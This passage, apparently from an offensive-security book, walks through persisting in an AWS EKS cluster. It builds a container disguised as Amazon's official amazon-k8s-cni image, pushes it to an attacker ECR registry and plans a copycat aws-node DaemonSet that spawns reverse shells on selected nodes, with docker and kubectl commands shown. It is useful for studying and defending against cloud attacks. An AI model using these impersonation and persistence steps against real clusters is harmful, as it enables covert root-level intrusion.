Finally, to further enhance the web of deceit, when we build the container’s image and push it to our own AWS ECR registry (ECR is the equivalent of Docker Hub on AWS), we do so under the guise of a legitimate Amazon container, amazon-k8s-cni:

```
root@Point1:~/# docker build \
-t 886477354405.dkr.ecr.eu-west-1.amazonaws.com/amazon-k8s-cni:v1.5.3 .

Successfully built be905757d9aa
Successfully tagged 886477354405.dkr.ecr.eu-west-1.amazonaws.com/amazon-k8s-cni:v1.5.3

# Authenticate to ECR
root@Point1:~/# $(aws ecr get-login --no-include-email --region eu-west-1)
root@Point1:~/# docker push 886477354405.dkr.ecr.eu-west-1.amazonaws.com/amazon-k8s-cni:v1.5.3
```

The names of the fake container (amazon-k8s-cni) and S3 bucket (amazon-cni-plugin-essentials) are not arbitrary choices. EKS runs a copy of a similar container on every single node to manage the network configuration of pods and nodes, as we can see if we grab a list of pods from any running cluster:

```
shell> kubectl get pods -n kube-system | grep aws-node
aws-node-rb8n2      1/1     Running   0   7d
aws-node-rs9d1      1/1     Running   0   23h
--snip--
```

These pods named aws-node-xxxx are running the official amazon-k8s-cni image hosted on AWS’s own repository.

These pods were created by a DaemonSet object, a Kubernetes resource that maintains at least one copy of a given pod constantly running on all (or some) nodes. Each of these aws-node pods is assigned a service account with read-only access to all namespaces, nodes, and pods. And to top it all off, they all automatically mount /var/run/docker.sock, giving them root privileges on the host. It is the perfect cover.

We will spawn an almost exact copy of this DaemonSet. Unlike the real one, however, this new DaemonSet will fetch its amazon-k8s-cni pod image from our own ECR repository. A DaemonSet runs by default on all machines. We do not want to end up with thousands of reverse shells phoning home at once, so we will only target a few nodes—for instance, the three bearing the “kafka-broker-collector” label. This is a good population size for our evil DaemonSet.

The following command displays machine names along with their labels:

```
shell> kubectl get nodes --show-labels

ip-192-168-178-150.eu-west-1.compute.internal

service=kafka-broker-collector,
beta.kubernetes.io/arch=amd64,
beta.kubernetes.io/instance-type=t2.small, beta.kubernetes.io/os=linux
```